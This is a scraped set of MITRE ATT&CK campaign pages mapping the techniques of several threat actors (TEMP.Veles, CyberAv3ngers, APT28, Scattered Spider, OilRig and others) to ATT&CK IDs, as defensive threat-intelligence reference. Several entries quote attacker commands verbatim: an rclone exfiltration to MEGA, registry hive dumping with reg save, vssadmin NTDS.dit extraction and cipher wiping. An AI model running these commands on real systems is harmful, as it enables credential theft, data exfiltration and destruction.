"content": " C0032 C0032 was an extended campaign suspected to involve the Triton adversaries with related capabilities and techniques focused on gaining a foothold within IT environments. This campaign occurred in 2019 and was distinctly different from the Triton Safety Instrumented System Attack.[1] ID: C0032 First Seen: October 2014 [1] Last Seen: January 2017 [1] Version: 1.0 Created: 28 March 2024 Last Modified: 15 April 2024 Version Permalink Live Version Groups ID Name Description G0088 TEMP.Veles [1] Techniques Used Domain ID Name Use Enterprise T1583 .003 Acquire Infrastructure: Virtual Private Server During the C0032 campaign, TEMP.Veles used Virtual Private Server (VPS) infrastructure.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell During the C0032 campaign, TEMP.Veles used PowerShell to perform timestomping.[1] Enterprise T1074 .001 Data Staged: Local Data Staging During the C0032 campaign, TEMP.Veles used staging folders that are infrequently used by legitimate users or processes to store data for exfiltration and tool deployment.[1] Enterprise T1546 .012 Event Triggered Execution: Image File Execution Options Injection During the C0032 campaign, TEMP.Veles modified and added entries within HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options to maintain persistence.[1] Enterprise T1133 External Remote Services During the C0032 campaign, TEMP.Veles used VPN access to persist in the victim environment.[1] Enterprise T1070 .004 Indicator Removal: File Deletion During the C0032 campaign, TEMP.Veles routinely deleted tools, logs, and other files after they were finished with them.[1] .006 Indicator Removal: Timestomp During the C0032 campaign, TEMP.Veles used timestomping to modify the $STANDARD_INFORMATION attribute on tools.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location During the C0032 campaign, TEMP.Veles renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files.[1] Enterprise T1571 Non-Standard Port During the C0032 campaign, TEMP.Veles used port-protocol mismatches on ports such as 443, 4444, 8531, and 50501 during C2.[1] Enterprise T1588 .002 Obtain Capabilities: Tool During the C0032 campaign, TEMP.Veles obtained and used tools such as Mimikatz and PsExec.[1] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory During the C0032 campaign, TEMP.Veles used Mimikatz and a custom tool, SecHack, to harvest credentials.[1] Enterprise T1572 Protocol Tunneling During the C0032 campaign, TEMP.Veles used encrypted SSH-based PLINK tunnels to transfer tools and enable RDP connections throughout the environment.[1] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol During the C0032 campaign, TEMP.Veles utilized RDP throughout an operation.[1] .004 Remote Services: SSH During the C0032 campaign, TEMP.Veles relied on encrypted SSH-based tunnels to transfer tools and for remote command/program execution.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task During the C0032 campaign, TEMP.Veles used scheduled task XML triggers.[1] Enterprise T1505 .003 Server Software Component: Web Shell During the C0032 campaign, TEMP.Veles planted Web shells on Outlook Exchange servers.[1] Enterprise T1078 Valid Accounts During the C0032 campaign, TEMP.Veles used compromised VPN accounts.[1] Software ID Name Description S0002 Mimikatz [1] References Miller, S, et al. (2019, April 10). TRITON Actor TTP Profile, Custom Attack Tools, Detections, and ATT&CK Mapping. Retrieved April 16, 2019. "
},
{
"id": 455,
"title": "Unitronics Defacement Campaign, Campaign C0031",
"path": "/campaigns/C0031/index.html",
"content": " Unitronics Defacement Campaign The Unitronics Defacement Campaign was a collection of intrusions across multiple sectors by the CyberAv3ngers, where threat actors engaged in a seemingly opportunistic and global targeting and defacement of Unitronics Vision Series Programmable Logic Controller (PLC) with Human-Machine Interface (HMI). The sectors that these PLCs can be commonly found in are water and wastewater, energy, food and beverage manufacturing, and healthcare. The most notable feature of this attack was the defacement of the PLCs' HMIs.[1][2] ID: C0031 First Seen: November 2023 [1] Last Seen: November 2023 [3] Version: 1.0 Created: 25 March 2024 Last Modified: 15 April 2024 Version Permalink Live Version Groups ID Name Description G1027 CyberAv3ngers [1] Techniques Used Domain ID Name Use ICS T0812 Default Credentials During the Unitronics Defacement Campaign, the CyberAv3ngers discovered and exploited default credentials found on many Unitronics Programmable Logic Controller (PLC) Human-Machine Interface (HMI). For many of these devices, the default password was set to \u20181111\u2019.[1][4] ICS T0814 Denial of Service During the Unitronics Defacement Campaign, the CyberAv3ngers defaced controllers\u2019 Human-Machine Interface (HMI), which prevented multiple entities from being able to operate their devices normally.[1][4][5][2] Additionally, the CyberAv3ngers caused a communications failure in a remote pumping station.[6] ICS T0883 Internet Accessible Device During the Unitronics Defacement Campaign, the CyberAv3ngers exploited devices connected to the public internet, such as internet connected Unitronics Programmable Logic Controller (PLC) with Human-Machine Interface (HMI) and networking equipment such as cellular modems found in OT environments.[1][3] ICS T0826 Loss of Availability During the Unitronics Defacement Campaign, the CyberAv3ngers caused multiple businesses to halt operations due to the unavailability of the Programmable Logic Controller (PLC) and Human-Machine Interface (HMI). These victims covered multiple sectors.[5] ICS T0828 Loss of Productivity and Revenue During the Unitronics Defacement Campaign, the CyberAv3ngers caused multiple businesses to halt operations in their industrial environments, impacting their typical business operations. These victims covered multiple sectors.[5] ICS T0829 Loss of View During the Unitronics Defacement Campaign, the CyberAv3ngers replaced the existing graphic on the Programmable Logic Controller (PLC) Human-Machine Interface (HMI) with their own, thereby preventing PLC owners and operators from viewing PLC information on the HMI.[1][5] References DHS/CISA. (2023, December 1). IRGC-Affiliated Cyber Actors Exploit PLCs in Multiple Sectors, Including U.S. Water and Wastewater Systems Facilities. Retrieved March 25, 2024. Frank Bajak and Marc Levy. (2023, December 2). Breaches by Iran-affiliated hackers spanned multiple U.S. states, federal agencies say. Retrieved March 25, 2024. Lisa Zahner. (2023, December 15). Hackers in Iran attack computer at Vero Utilities. Retrieved March 25, 2024. DHS/CISA. (2023, November 28). Exploitation of Unitronics PLCs used in Water and Wastewater Systems. Retrieved March 25, 2024. Jamie Tarabay and Katrina Manson. (2023, December 22). Iranian-Linked Hacks Expose Failure to Safeguard US Water System. Retrieved March 25, 2024. WPXI. (2023, November 27). Officials investigating cyberattack on Municipal Water Authority of Aliquippa. Retrieved March 25, 2024. "
},
{
"id": 456,
"title": "SPACEHOP Activity, Campaign C0052",
"path": "/campaigns/C0052/index.html",
"content": " SPACEHOP Activity SPACEHOP Activity is conducted through commercially leased Virtual Private Servers (VPS), otherwise known as provisioned Operational Relay Box (ORB) networks. The network leveraged for SPACEHOP Activity enabled China-nexus cyber threat actors \u2013 such as APT5 and Ke3chang \u2013 to perform network reconnaissance scanning and vulnerability exploitation. SPACEHOP Activity has historically targeted entities in North America, Europe, and the Middle East.[1] ID: C0052 First Seen: January 2019 [1] Last Seen: May 2024 [1] Version: 1.0 Created: 25 March 2025 Last Modified: 27 March 2025 Version Permalink Live Version Groups ID Name Description G1023 APT5 [1] G0004 Ke3chang [1] Techniques Used Domain ID Name Use Enterprise T1583 .003 Acquire Infrastructure: Virtual Private Server SPACEHOP Activity has used acquired Virtual Private Servers as control systems for devices within the ORB network.[1] Enterprise T1190 Exploit Public-Facing Application SPACEHOP Activity has enabled the exploitation of CVE-2022-27518 and CVE-2022-27518 for illegitimate access.[2][1] Enterprise T1588 .002 Obtain Capabilities: Tool SPACEHOP Activity leverages a C2 framework sourced from a publicly-available Github repository for administration of relay nodes.[1] Enterprise T1090 .003 Proxy: Multi-hop Proxy SPACEHOP Activity has routed traffic through chains of compromised network devices to proxy C2 communications.[1] References Raggi, Michael. (2024, May 22). IOC Extinction? China-Nexus Cyber Espionage Actors Use ORB Networks to Raise Cost on Defenders. Retrieved July 8, 2024. National Security Agency. (2022, December). APT5: Citrix ADC Threat Hunting Guidance. Retrieved February 5, 2024. "
},
{
"id": 457,
"title": "C0015, Campaign C0015",
"path": "/campaigns/C0015/index.html",
"content": " C0015 C0015 was a ransomware intrusion during which the unidentified attackers used Bazar, Cobalt Strike, and Conti, along with other tools, over a 5 day period. Security researchers assessed the actors likely used the widely-circulated Conti ransomware playbook based on the observed pattern of activity and operator errors.[1] ID: C0015 First Seen: August 2021 [1] Last Seen: August 2021 [1] Contributors: Matt Brenton, Zurich Insurance Group Version: 1.0 Created: 29 September 2022 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell During C0015, the threat actors used cmd.exe to execute commands and run malicious binaries.[1] .005 Command and Scripting Interpreter: Visual Basic During C0015, the threat actors used a malicious HTA file that contained a mix of HTML and JavaScript/VBScript code.[1] .007 Command and Scripting Interpreter: JavaScript During C0015, the threat actors used a malicious HTA file that contained a mix of encoded HTML and JavaScript/VBScript code.[1] Enterprise T1486 Data Encrypted for Impact During C0015, the threat actors used Conti ransomware to encrypt a compromised network.[1] Enterprise T1005 Data from Local System During C0015, the threat actors obtained files and data from the compromised network.[1] Enterprise T1039 Data from Network Shared Drive During C0015, the threat actors collected files from network shared drives prior to network encryption.[1] Enterprise T1074 .001 Data Staged: Local Data Staging During C0015, PowerView's file share enumeration results were stored in the file c:\\ProgramData\\found_shares.txt.[1] Enterprise T1030 Data Transfer Size Limits During C0015, the threat actors limited Rclone's bandwidth setting during exfiltration.[1] Enterprise T1482 Domain Trust Discovery During C0015, the threat actors used the command nltest /domain_trusts /all_trusts to enumerate domain trusts.[1] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage During C0015, the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the Rclone command rclone.exe copy --max-age 2y \"\\\\SERVER\\Shares\" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M.[1] Enterprise T1083 File and Directory Discovery During C0015, the threat actors conducted a file listing discovery against multiple hosts to ensure locker encryption was successful.[1] Enterprise T1105 Ingress Tool Transfer During C0015, the threat actors downloaded additional tools and files onto a compromised network.[1] Enterprise T1570 Lateral Tool Transfer During C0015, the threat actors used WMI to load Cobalt Strike onto additional hosts within a compromised network.[1] Enterprise T1036 Masquerading During C0015, the threat actors named a binary file compareForfor.jpg to disguise it as a JPG file.[1] Enterprise T1135 Network Share Discovery During C0015, the threat actors executed the PowerView ShareFinder module to identify open shares.[1] Enterprise T1027 Obfuscated Files or Information During C0015, the threat actors used Base64-encoded strings.[1] Enterprise T1588 .001 Obtain Capabilities: Malware For C0015, the threat actors used Cobalt Strike and Conti ransomware.[1] .002 Obtain Capabilities: Tool For C0015, the threat actors obtained a variety of tools, including AdFind, AnyDesk, and Process Hacker.[1] Enterprise T1069 .001 Permission Groups Discovery: Local Groups During C0015, the threat actors used the command net localgroup \"adminstrator\" to identify accounts with local administrator rights.[1] .002 Permission Groups Discovery: Domain Groups During C0015, the threat actors use the command net group \"domain admins\" /dom to enumerate domain groups.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment For C0015, security researchers assessed the threat actors likely used a phishing campaign to distribute a weaponized attachment to victims.[1] Enterprise T1057 Process Discovery During C0015, the threat actors used the tasklist /s command as well as taskmanager to obtain a list of running processes.[1] Enterprise T1055 .001 Process Injection: Dynamic-link Library Injection During C0015, the threat actors used a DLL named D8B3.dll that was injected into the Winlogon process.[1] Enterprise T1219 .002 Remote Access Tools: Remote Desktop Software During C0015, the threat actors installed the AnyDesk remote desktop application onto the compromised network.[1] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol During C0015, the threat actors used RDP to access specific network hosts of interest.[1] Enterprise T1018 Remote System Discovery During C0015, the threat actors used the commands net view /all /domain and ping to discover remote systems. They also used PowerView's PowerShell Invoke-ShareFinder script for file share enumeration.[1] Enterprise T1553 .002 Subvert Trust Controls: Code Signing For C0015, the threat actors used DLL files that had invalid certificates.[1] Enterprise T1218 .005 System Binary Proxy Execution: Mshta During C0015, the threat actors used mshta to execute DLLs.[1] .010 System Binary Proxy Execution: Regsvr32 During C0015, the threat actors employed code that used regsvr32 for execution.[1] .011 System Binary Proxy Execution: Rundll32 During C0015, the threat actors loaded DLLs via rundll32 using the svchost process.[1] Enterprise T1016 System Network Configuration Discovery During C0015, the threat actors used code to obtain the external public-facing IPv4 address of the compromised host.[1] Enterprise T1124 System Time Discovery During C0015, the threat actors used the command net view /all time to gather the local time of a compromised network.[1] Enterprise T1204 .002 User Execution: Malicious File During C0015, the threat actors relied on users to enable macros within a malicious Microsoft Word document.[1] Enterprise T1047 Windows Management Instrumentation During C0015, the threat actors used wmic and rundll32 to load Cobalt Strike onto a target host.[1] Software ID Name Description S0552 AdFind [1] S0534 Bazar [1] S0154 Cobalt Strike [1] S0575 Conti [1] S1040 Rclone [1] References DFIR Report. (2021, November 29). CONTInuing the Bazar Ransomware Story. Retrieved September 29, 2022. "
},
{
"id": 458,
"title": "APT28 Nearest Neighbor Campaign, Campaign C0051",
"path": "/campaigns/C0051/index.html",
"content": " APT28 Nearest Neighbor Campaign APT28 Nearest Neighbor Campaign was conducted by APT28 from early February 2022 to November 2024 against organizations and individuals with expertise on Ukraine. APT28 primarily leveraged living-off-the-land techniques, while leveraging the zero-day exploitation of CVE-2022-38028. Notably, APT28 leveraged Wi-Fi networks in close proximity to the intended target to gain initial access to the victim environment. By daisy-chaining multiple compromised organizations nearby the intended target, APT28 discovered dual-homed systems (with both a wired and wireless network connection) to enable Wi-Fi and use compromised credentials to connect to the victim network.[1] ID: C0051 First Seen: February 2022 [1] Last Seen: November 2024 [1] Version: 1.0 Created: 25 February 2025 Last Modified: 10 March 2025 Version Permalink Live Version Groups ID Name Description G0007 APT28 APT28 Nearest Neighbor Campaign was conducted by APT28 from early February 2022 to November 2024.[1] Techniques Used Domain ID Name Use Enterprise T1560 .001 Archive Collected Data: Archive via Utility During APT28 Nearest Neighbor Campaign, APT28 used built-in PowerShell capabilities (Compress-Archive cmdlet) to compress collected data.[1] Enterprise T1110 .003 Brute Force: Password Spraying During APT28 Nearest Neighbor Campaign, APT28 performed password-spray attacks against public facing services to validate credentials.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell During APT28 Nearest Neighbor Campaign, APT28 used PowerShell cmdlet Get-ChildItem to access credentials, among other PowerShell functions deployed.[1] .003 Command and Scripting Interpreter: Windows Command Shell During APT28 Nearest Neighbor Campaign, APT28 used cmd.exe for execution.[1] Enterprise T1584 Compromise Infrastructure During APT28 Nearest Neighbor Campaign, APT28 compromised third-party infrastructure in physical proximity to targets of interest for follow-on activities.[1] Enterprise T1074 .001 Data Staged: Local Data Staging During APT28 Nearest Neighbor Campaign, APT28 staged captured credential information in the C:\\ProgramData directory.[1] Enterprise T1140 Deobfuscate/Decode Files or Information During APT28 Nearest Neighbor Campaign, APT28 unarchived data using the GUI version of WinRAR.[1] Enterprise T1006 Direct Volume Access During APT28 Nearest Neighbor Campaign, APT28 accessed volume shadow copies through executing vssadmin in order to dump the NTDS.dit file.[1] Enterprise T1561 .001 Disk Wipe: Disk Content Wipe During APT28 Nearest Neighbor Campaign, APT28 used the native Microsoft utility cipher.exe to securely wipe files and folders \u2013 overwriting the deleted data using cmd.exe /c cipher /W:C.[1] Enterprise T1567 Exfiltration Over Web Service During APT28 Nearest Neighbor Campaign, APT28 exfiltrated data over public-facing webservers \u2013 such as Google Drive.[1] Enterprise T1562 .004 Impair Defenses: Disable or Modify System Firewall During APT28 Nearest Neighbor Campaign, APT28 added rules to a victim's Windows firewall to set up a series of port-forwards allowing traffic to target systems.[1] Enterprise T1003 .002 OS Credential Dumping: Security Account Manager During APT28 Nearest Neighbor Campaign, APT28 used the following commands to dump SAM, SYSTEM, and SECURITY hives: reg save hklm\\sam, reg save hklm\\system, and reg save hklm\\security.[1] .003 OS Credential Dumping: NTDS During APT28 Nearest Neighbor Campaign, APT28 dumped NTDS.dit through creating volume shadow copies via vssadmin.[1] Enterprise T1090 .001 Proxy: Internal Proxy During APT28 Nearest Neighbor Campaign, APT28 used the built-in netsh portproxy command to create internal proxies on compromised systems.[1] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol During APT28 Nearest Neighbor Campaign, APT28 used RDP for lateral movement.[1] .002 Remote Services: SMB/Windows Admin Shares During APT28 Nearest Neighbor Campaign, APT28 leveraged SMB to transfer files and move laterally.[1] Enterprise T1016 .002 System Network Configuration Discovery: Wi-Fi Discovery During APT28 Nearest Neighbor Campaign, APT28 collected information on wireless interfaces within range of a compromised system.[1] Enterprise T1669 Wi-Fi Networks During APT28 Nearest Neighbor Campaign, APT28 established wireless connections to secure, enterprise Wi-Fi networks belonging to a target organization for initial access into the environment.[1] Software ID Name Description S1205 cipher.exe APT28 [1]APT28 Nearest Neighbor Campaign [1] S0108 netsh APT28[1]APT28 Nearest Neighbor Campaign[1] References Koessel, Sean. Adair, Steven. Lancaster, Tom. (2024, November 22). The Nearest Neighbor Attack: How A Russian APT Weaponized Nearby Wi-Fi Networks for Covert Access. Retrieved February 25, 2025. "
},
{
"id": 459,
"title": "C0027, Campaign C0027",
"path": "/campaigns/C0027/index.html",
"content": " C0027 C0027 was a financially-motivated campaign linked to Scattered Spider that targeted telecommunications and business process outsourcing (BPO) companies from at least June through December of 2022. During C0027 Scattered Spider used various forms of social engineering, performed SIM swapping, and attempted to leverage access from victim environments to mobile carrier networks.[1] ID: C0027 First Seen: June 2022 [1] Last Seen: December 2022 [1] Version: 1.0 Created: 30 June 2023 Last Modified: 16 April 2025 Version Permalink Live Version Groups ID Name Description G1015 Scattered Spider [1] Techniques Used Domain ID Name Use Enterprise T1087 .003 Account Discovery: Email Account During C0027, Scattered Spider accessed Azure AD to identify email addresses.[1] .004 Account Discovery: Cloud Account During C0027, Scattered Spider accessed Azure AD to download bulk lists of group members and to identify privileged users, along with the email addresses and AD attributes.[1] Enterprise T1098 .001 Account Manipulation: Additional Cloud Credentials During C0027, Scattered Spider used aws_consoler to create temporary federated credentials for fake users in order to obfuscate which AWS credential is compromised and enable pivoting from the AWS CLI to console sessions without MFA.[1] .003 Account Manipulation: Additional Cloud Roles During C0027, Scattered Spider used IAM manipulation to gain persistence and to assume or elevate privileges.[1] .005 Account Manipulation: Device Registration During C0027, Scattered Spider registered devices for MFA to maintain persistence through victims' VPN.[1] Enterprise T1530 Data from Cloud Storage During C0027, Scattered Spider accessed victim OneDrive environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides.[1] Enterprise T1213 .002 Data from Information Repositories: Sharepoint During C0027, Scattered Spider accessed victim SharePoint environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides.[1] Enterprise T1190 Exploit Public-Facing Application During C0027, Scattered Spider exploited CVE-2021-35464 in the ForgeRock Open Access Management (OpenAM) application server to gain initial access.[1] Enterprise T1133 External Remote Services During C0027, Scattered Spider used Citrix and VPNs to persist in compromised environments.[1] Enterprise T1589 .001 Gather Victim Identity Information: Credentials During C0027, Scattered Spider sent phishing messages via SMS to steal credentials.[1] Enterprise T1656 Impersonation During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools.[1] Enterprise T1105 Ingress Tool Transfer During C0027, Scattered Spider downloaded tools using victim organization systems.[1] Enterprise T1578 .002 Modify Cloud Compute Infrastructure: Create Cloud Instance During C0027, Scattered Spider used access to the victim's Azure tenant to create Azure VMs.[1] Enterprise T1621 Multi-Factor Authentication Request Generation During C0027, Scattered Spider attempted to gain access by continuously sending MFA messages to the victim until they accept the MFA push challenge.[1] Enterprise T1046 Network Service Discovery During C0027, used RustScan to scan for open ports on targeted ESXi appliances.[1] Enterprise T1588 .002 Obtain Capabilities: Tool During C0027, Scattered Spider obtained and used multiple tools including the LINpeas privilege escalation utility, aws_consoler, rsocx reverse proxy, Level RMM tool, and RustScan port scanner.[1] Enterprise T1003 .006 OS Credential Dumping: DCSync During C0027, Scattered Spider performed domain replication.[1] Enterprise T1069 .003 Permission Groups Discovery: Cloud Groups During C0027, Scattered Spider accessed Azure AD to download bulk lists of group members and their Active Directory attributes.[1] Enterprise T1566 .004 Phishing: Spearphishing Voice During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls to direct victims to download a remote monitoring and management (RMM) tool that would allow the adversary to remotely control their system.[1] Enterprise T1598 .001 Phishing for Information: Spearphishing Service During C0027, Scattered Spider sent Telegram messages impersonating IT personnel to harvest credentials.[1] .004 Phishing for Information: Spearphishing Voice During C0027, Scattered Spider used phone calls to instruct victims to navigate to credential-harvesting websites.[1] Enterprise T1572 Protocol Tunneling During C0027, Scattered Spider used SSH tunneling in targeted environments.[1] Enterprise T1090 Proxy During C0027, Scattered Spider installed the open-source rsocx reverse proxy tool on a targeted ESXi appliance.[1] Enterprise T1219 Remote Access Tools During C0027, Scattered Spider directed victims to run remote monitoring and management (RMM) tools.[1] Enterprise T1021 .007 Remote Services: Cloud Services During C0027, Scattered Spider used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems.[1] Enterprise T1078 .004 Valid Accounts: Cloud Accounts During C0027, Scattered Spider leveraged compromised credentials from victim users to authenticate to Azure tenants.[1] Enterprise T1102 Web Service During C0027, Scattered Spider downloaded tools from sites including file.io, GitHub, and paste.ee.[1] Enterprise T1047 Windows Management Instrumentation During C0027, Scattered Spider used Windows Management Instrumentation (WMI) to move laterally via Impacket.[1] Software ID Name Description S0357 Impacket During C0027, Scattered Spider used Impacket for lateral movement.[1] References Parisi, T. (2022, December 2). Not a SIMulation: CrowdStrike Investigations Reveal Intrusion Campaign Targeting Telco and BPO Companies. Retrieved June 30, 2023. "
},
{
"id": 460,
"title": "Operation Spalax, Campaign C0005",
"path": "/campaigns/C0005/index.html",
"content": " Operation Spalax Operation Spalax was a campaign that primarily targeted Colombian government organizations and private companies, particularly those associated with the energy and metallurgical industries. The Operation Spalax threat actors distributed commodity malware and tools using generic phishing topics related to COVID-19, banking, and law enforcement action. Security researchers noted indicators of compromise and some infrastructure overlaps with other campaigns dating back to April 2018, including at least one separately attributed to APT-C-36, however identified enough differences to report this as separate, unattributed activity.[1] ID: C0005 First Seen: November 2019 [1] Last Seen: January 2021 [1] Version: 1.1 Created: 16 September 2022 Last Modified: 11 April 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains For Operation Spalax, the threat actors registered hundreds of domains using Duck DNS and DNS Exit.[1] Enterprise T1059 Command and Scripting Interpreter For Operation Spalax, the threat actors used Nullsoft Scriptable Install System (NSIS) scripts to install malware.[1] Enterprise T1140 Deobfuscate/Decode Files or Information For Operation Spalax, the threat actors used a variety of packers and droppers to decrypt malicious payloads.[1] Enterprise T1568 Dynamic Resolution For Operation Spalax, the threat actors used dynamic DNS services, including Duck DNS and DNS Exit, as part of their C2 infrastructure.[1] Enterprise T1027 .002 Obfuscated Files or Information: Software Packing For Operation Spalax, the threat actors used a variety of packers, including CyaX, to obfuscate malicious executables.[1] .003 Obfuscated Files or Information: Steganography For Operation Spalax, the threat actors used packers that read pixel data from images contained in PE files' resource sections and build the next layer of execution from the data.[1] .013 Obfuscated Files or Information: Encrypted/Encoded File For Operation Spalax, the threat actors used XOR-encrypted payloads.[1] Enterprise T1588 .001 Obtain Capabilities: Malware For Operation Spalax, the threat actors obtained malware, including Remcos, njRAT, and AsyncRAT.[1] .002 Obtain Capabilities: Tool For Operation Spalax, the threat actors obtained packers such as CyaX.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment During Operation Spalax, the threat actors sent phishing emails that included a PDF document that in some cases led to the download and execution of malware.[1] .002 Phishing: Spearphishing Link During Operation Spalax, the threat actors sent phishing emails to victims that contained a malicious link.[1] Enterprise T1608 .001 Stage Capabilities: Upload Malware For Operation Spalax, the threat actors staged malware and malicious files in legitimate hosting services such as OneDrive or MediaFire.[1] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 During Operation Spalax, the threat actors used rundll32.exe to execute malicious installers.[1] Enterprise T1204 .001 User Execution: Malicious Link During Operation Spalax, the threat actors relied on a victim to click on a malicious link distributed via phishing emails.[1] .002 User Execution: Malicious File During Operation Spalax, the threat actors relied on a victim to open a PDF document and click on an embedded malicious link to download malware.[1] Enterprise T1497 Virtualization/Sandbox Evasion During Operation Spalax, the threat actors used droppers that would run anti-analysis checks before executing malware on a compromised host.[1] Enterprise T1102 Web Service During Operation Spalax, the threat actors used OneDrive and MediaFire to host payloads.[1] Software ID Name Description S0385 njRAT [1] S0332 Remcos [1] References M. Porolli. (2021, January 21). Operation Spalax: Targeted malware attacks in Colombia. Retrieved September 16, 2022. "
},
{
"id": 461,
"title": "Outer Space, Campaign C0042",
"path": "/campaigns/C0042/index.html",
"content": " Outer Space Outer Space was a campaign conducted by OilRig throughout 2021 that used the SampleCheck5000 downloader and Solar backdoor to target Israeli organizations.[1] ID: C0042 First Seen: January 2021 [1] Last Seen: December 2021 [1] Version: 1.0 Created: 21 November 2024 Last Modified: 25 November 2024 Version Permalink Live Version Groups ID Name Description G0049 OilRig [1] Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols During Outer Space, OilRig used HTTP to communicate between installed backdoors and compromised servers including via the Microsoft Exchange Web Services API.[1] Enterprise T1217 Browser Information Discovery During Outer Space, OilRig used a Chrome data dumper named MKG.[1] Enterprise T1059 .005 Command and Scripting Interpreter: Visual Basic During Outer Space, OilRig used VBS droppers to deploy malware.[1] Enterprise T1584 .004 Compromise Infrastructure: Server During Outer Space, OilRig compromised an Israeli human resources site to use as a C2 server.[1] Enterprise T1587 .001 Develop Capabilities: Malware For Outer Space, OilRig created new implants including the Solar backdoor.[1] Enterprise T1585 .003 Establish Accounts: Cloud Accounts During Outer Space, OilRig created M365 email accounts to be used as part of C2.[1] Enterprise T1105 Ingress Tool Transfer During Outer Space, OilRig downloaded additional tools to comrpomised infrastructure.[1] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File During Outer Space, OilRig deployed VBS droppers with obfuscated strings.[1] Software ID Name Description S1168 SampleCheck5000 [1] S1166 Solar [1] References Hromcova, Z. and Burgher, A. (2023, September 21). OilRig\u2019s Outer Space and Juicy Mix: Same ol\u2019 rig, new drill pipes. Retrieved November 21, 2024. "
},
{
"id": 462,
"title": "Operation CuckooBees, Campaign C0012",
"path": "/campaigns/C0012/index.html",
"content": " Operation CuckooBees Operation CuckooBees was a cyber espionage campaign targeting technology and manufacturing companies in East Asia, Western Europe, and North America since at least 2019. Security researchers noted the goal of Operation CuckooBees, which was still ongoing as of May 2022, was likely the theft of proprietary information, research and development documents, source code, and blueprints for various technologies. Researchers assessed Operation CuckooBees was conducted by actors affiliated with Winnti Group, APT41, and BARIUM.[1] ID: C0012 First Seen: December 2019 [1] Last Seen: May 2022 [1] Contributors: Andrea Serrano Urea, Telef\u00f3nica Tech Version: 1.1 Created: 22 September 2022 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1087 .001 Account Discovery: Local Account During Operation CuckooBees, the threat actors used the net user command to gather account information.[1] .002 Account Discovery: Domain Account During Operation CuckooBees, the threat actors used the dsquery and dsget commands to get domain environment information and to query users in administrative groups.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols During Operation CuckooBees, the threat actors enabled HTTP and HTTPS listeners.[1] Enterprise T1560 .001 Archive Collected Data: Archive via Utility During Operation CuckooBees, the threat actors used the Makecab utility to compress and a version of WinRAR to create password-protected archives of stolen data prior to exfiltration.[1] Enterprise T1547 .006 Boot or Logon Autostart Execution: Kernel Modules and Extensions During Operation CuckooBees, attackers used a signed kernel rootkit to establish additional persistence.[1] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell During Operation CuckooBees, the threat actors used batch scripts to perform reconnaissance.[1] .005 Command and Scripting Interpreter: Visual Basic During Operation CuckooBees, the threat actors executed an encoded VBScript file using wscript and wrote the decoded output to a text file.[1] Enterprise T1543 .003 Create or Modify System Process: Windows Service During Operation CuckooBees, the threat actors modified the IKEEXT and PrintNotify Windows services for persistence.[1] Enterprise T1005 Data from Local System During Operation CuckooBees, the threat actors collected data, files, and other information from compromised networks.[1] Enterprise T1190 Exploit Public-Facing Application During Operation CuckooBees, the threat actors exploited multiple vulnerabilities in externally facing servers.[1] Enterprise T1133 External Remote Services During Operation CuckooBees, the threat actors enabled WinRM over HTTP/HTTPS as a backup persistence mechanism using the following command: cscript //nologo \"C:\\Windows\\System32\\winrm.vbs\" set winrm/config/service@{EnableCompatibilityHttpsListener=\"true\"}.[1] Enterprise T1083 File and Directory Discovery During Operation CuckooBees, the threat actors used dir c:\\\\ to search for files.[1] Enterprise T1574 .001 Hijack Execution Flow: DLL During Operation CuckooBees, the threat actors used the legitimate Windows services IKEEXT and PrintNotify to side-load malicious DLLs.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location During Operation CuckooBees, the threat actors renamed a malicious executable to rundll32.exe to allow it to blend in with other Windows system files.[1] Enterprise T1135 Network Share Discovery During Operation CuckooBees, the threat actors used the net share command as part of their advanced reconnaissance.[1] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation During Operation CuckooBees, the threat actors executed an encoded VBScript file.[1] .011 Obfuscated Files or Information: Fileless Storage During Operation CuckooBees, the threat actors stroed payloads in Windows CLFS (Common Log File System) transactional logs.[1] Enterprise T1588 .002 Obtain Capabilities: Tool For Operation CuckooBees, the threat actors obtained publicly-available JSP code that was used to deploy a webshell onto a compromised server.[1] Enterprise T1003 .002 OS Credential Dumping: Security Account Manager During Operation CuckooBees, the threat actors leveraged a custom tool to dump OS credentials and used following commands: reg save HKLM\\\\SYSTEM system.hiv, reg save HKLM\\\\SAM sam.hiv, and reg save HKLM\\\\SECURITY security.hiv, to dump SAM, SYSTEM and SECURITY hives.[1] Enterprise T1201 Password Policy Discovery During Operation CuckooBees, the threat actors used the net accounts command as part of their advanced reconnaissance.[1] Enterprise T1120 Peripheral Device Discovery During Operation CuckooBees, the threat actors used the fsutil fsinfo drives command as part of their advanced reconnaissance.[1] Enterprise T1069 .001 Permission Groups Discovery: Local Groups During Operation CuckooBees, the threat actors used the net group command as part of their advanced reconnaissance.[1] 